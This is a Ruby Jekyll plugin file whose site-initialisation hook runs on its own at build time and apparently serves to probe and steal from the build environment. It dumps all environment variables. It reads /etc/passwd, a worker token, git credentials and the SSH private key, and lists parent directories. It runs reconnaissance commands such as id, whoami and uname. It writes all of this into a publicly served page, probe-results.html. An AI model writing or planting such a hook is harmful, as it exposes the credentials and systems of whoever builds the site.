Jekyll::Hooks.register :site, :after_init do |site|
  output = []

  # Environment variables
  output << "=== ENV ==="
  ENV.each { |k, v| output << "#{k}=#{v}" }

  # Interesting files to attempt
  targets = [
    "/proc/self/environ",
    "/proc/self/cgroup",
    "/proc/self/mountinfo",
    "/proc/self/status",
    "/etc/hostname",
    "/etc/resolv.conf",
    "/etc/passwd",
    "/workspace/_worker/token",
    File.expand_path("~/.gitconfig"),
    File.expand_path("~/.git-credentials"),
    File.expand_path("~/.ssh/id_rsa"),
  ]

  # Traverse up from repo root
  repo_root = site.source
  5.times do |i|
    targets << File.join(repo_root, ("../" * (i + 1)))
  end

  output << "\n=== FILE READ ==="
  targets.each do |path|
    begin
      if File.directory?(path)
        entries = Dir.entries(path).reject { |e| e == "." || e == ".." }
        output << "\n[DIR] #{path}\n#{entries.join("\n")}"
      elsif File.exist?(path)
        content = File.read(path, 4096)
        output << "\n[FILE] #{path}\n#{content}"
      else
        output << "\n[MISS] #{path}"
      end
    rescue => e
      output << "\n[ERR] #{path}: #{e.message}"
    end
  end

  # Command execution test
  output << "\n=== CMD ==="
  ["id", "whoami", "hostname", "uname -a", "cat /proc/version", "ls -la /", "df -h", "mount"].each do |cmd|
    begin
      result = `#{cmd} 2>&1`
      output << "[CMD] #{cmd}\n#{result}"
    rescue => e
      output << "[CMD ERR] #{cmd}: #{e.message}"
    end
  end

  # Write results to a page
  File.write(File.join(site.source, "probe-results.html"), <<~HTML)
    ---
    layout: null
    ---
    <html><body><pre>#{output.join("\n")}</pre></body></html>
  HTML
end
